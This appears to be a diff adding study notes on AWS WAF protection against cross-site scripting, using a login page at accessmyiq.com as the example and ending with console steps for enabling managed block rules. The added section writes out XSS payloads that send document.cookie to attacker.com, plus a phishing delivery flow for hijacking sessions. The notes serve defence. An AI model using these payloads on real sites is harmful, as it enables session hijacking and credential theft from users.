@@ -1,7 +1,111 @@
 AWS WAF is a web application firewall that protects your web applications from common web exploits and attacks like SQL injection, XSS, and DDoS.
-
+-------------------------------------------------------------
 XSS protection means preventing Cross-Site Scripting (XSS) attacks
 XSS is when an attacker injects malicious JavaScript into a web application, which then runs in other users’ browsers.
+
+Method 1 — URL parameter injection:
+
+Normal login URL:
+https://www.accessmyiq.com/login
+
+Attacker crafts malicious URL:
+https://www.accessmyiq.com/login?msg=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+
+Attacker sends this URL to victim
+via email/chat/SMS
+
+Method 2 — Login error message:
+
+App shows error like:
+"Invalid username: <username you typed>"
+
+Attacker types username as:
+<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+
+App displays:
+"Invalid username: <script>...</script>"
+→ browser executes it ❌
+
+Method 3 — Redirect parameter:
+
+https://www.accessmyiq.com/login?redirect=<script>...</script>
+
+After login, app redirects to that value
+→ script executes ❌
+
+What attacker steals from login page:
+
+Login page specific targets:
+├── Session cookies        ← already logged in users
+├── CSRF tokens            ← bypass form protection
+├── Auto-fill credentials  ← saved passwords
+└── Redirect to fake login ← steal username/password directly
+
+Full attack flow on accessmyiq.com:
+
+Attacker crafts malicious URL
+      ↓
+Sends to victim (email/WhatsApp)
+"Click here to login to your IQ account"
+      ↓
+Victim clicks → opens login page
+      ↓
+Script executes in victim's browser
+      ↓
+Either:
+├── Cookies stolen → session hijacked ❌
+└── Fake form → credentials stolen ❌
+      ↓
+Attacker has full account access ❌
+
+WAF blocks it:
+
+Malicious URL hits WAF first
+      ↓
+WAF sees <script> in URL parameter
+      ↓
+BLOCKED 403 ❌
+      ↓
+Never reaches accessmyiq.com server ✅
+-----------
+
+How to set up WAF XSS protection:
+Step 1 — Create WAF Web ACL:
+
+AWS Console
+→ WAF & Shield
+→ Create Web ACL
+→ Name: my-waf
+→ Resource: ALB / CloudFront / API Gateway
+
+Step 2 — Add AWS Managed Rules:
+
+Add rules
+→ AWS Managed Rules
+→ Add:
+  ✅ AWSManagedRulesCommonRuleSet    ← blocks XSS, SQLi
+  ✅ AWSManagedRulesKnownBadInputsRuleSet
+→ Action: Block
+
+Step 3 — Attach to ALB:
+
+Associate Web ACL
+→ select your ALB
+→ Save ✅
+
+Traffic flow with WAF:
+
+Internet
+    ↓
+AWS WAF (inspects every request)
+    ├── <script> found     → BLOCK ❌
+    ├── SQL injection found → BLOCK ❌
+    ├── Normal request     → ALLOW ✅
+    ↓
+ALB
+    ↓
+Your App
+---------------------------------------------------------
 
 🔵 How WAF Works
 
